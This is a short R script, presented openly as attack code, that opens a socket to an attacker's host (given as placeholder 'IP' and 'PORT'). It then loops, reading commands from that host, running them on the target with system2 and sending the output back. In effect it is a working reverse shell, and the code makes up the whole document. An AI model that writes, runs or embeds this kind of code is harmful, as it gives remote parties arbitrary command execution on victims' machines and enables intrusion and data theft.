# Create a connection to the attacker's machine
# Replace PORT with the appropriate value
conn <- socketConnection(host="IP", port=PORT, server=FALSE, blocking=TRUE)

while(TRUE) {
    # Wait for 1 second before trying to read the command
    Sys.sleep(1)
    # Read command from connection
    cmd <- readLines(conn,n=1)
    if(!is.null(cmd) && cmd != ""){
        # Use tryCatch to handle errors
        output <- tryCatch({
            # Execute command on target system and capture output
            output <- system2(cmd, stdout=TRUE)
        }, error = function(e) {
            # Return error message
            return("Command not found")
        })
        # Send output back to connection
        writeLines(output, conn)
    }
}
